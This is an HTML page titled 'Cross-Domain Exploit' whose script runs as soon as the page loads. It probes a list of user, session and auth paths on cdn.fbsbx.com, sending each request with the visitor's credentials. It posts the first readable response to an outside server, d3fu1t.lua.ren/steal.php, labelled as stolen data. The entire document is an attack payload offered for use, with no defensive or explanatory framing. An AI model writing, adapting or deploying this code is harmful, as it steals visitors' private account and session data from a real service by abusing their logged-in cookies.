<!DOCTYPE html>
<html>
<head>
    <title>Cross-Domain Exploit</title>
</head>
<body>
    <h1>Scanning...</h1>

    <script>
        // List of common target directories
        const baseURLs = [
            "https://cdn.fbsbx.com/user-info",
            "https://cdn.fbsbx.com/profile-data",
            "https://cdn.fbsbx.com/private-info",
            "https://cdn.fbsbx.com/account/settings",
            "https://cdn.fbsbx.com/api",
            "https://cdn.fbsbx.com/data",
            "https://cdn.fbsbx.com/auth",
            "https://cdn.fbsbx.com/session",
            "https://cdn.fbsbx.com/session-info",
            "https://cdn.fbsbx.com/me",
            "https://cdn.fbsbx.com/identity",
            "https://cdn.fbsbx.com/secure",
            "https://cdn.fbsbx.com/user",
            "https://cdn.fbsbx.com/accounts",
            "https://cdn.fbsbx.com/details",
            "https://cdn.fbsbx.com/api/user",
            "https://cdn.fbsbx.com/api/session",
            "https://cdn.fbsbx.com/api/login",
            "https://cdn.fbsbx.com/auth/session"
        ];

        // Common API version paths to scan
        const versions = ["", "/v1", "/v2", "/v3", "/v4", "/v5", "/latest"];

        async function findAndExploit() {
            for (let base of baseURLs) {
                for (let version of versions) {
                    let target = base + version;

                    try {
                        console.log("[*] Trying: " + target);

                        let response = await fetch(target, { credentials: "include" });

                        if (response.status === 200) {
                            console.log("[+] Found accessible data at: " + target);

                            let stolenData = await response.text();

                            // Send stolen data to the attacker's server
                            await fetch("https://d3fu1t.lua.ren/steal.php", { 
                                method: "POST",
                                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                                body: "stolen_data=" + encodeURIComponent("Source: " + target + "\n" + stolenData)
                            });

                            console.log("[+] Data stolen successfully!");
                            return; // Stop scanning after finding one working endpoint
                        } 
                    } catch (error) {
                        console.log("[-] Error accessing " + target + ": " + error);
                    }
                }
            }
        }

        findAndExploit();
    </script>
</body>
</html>
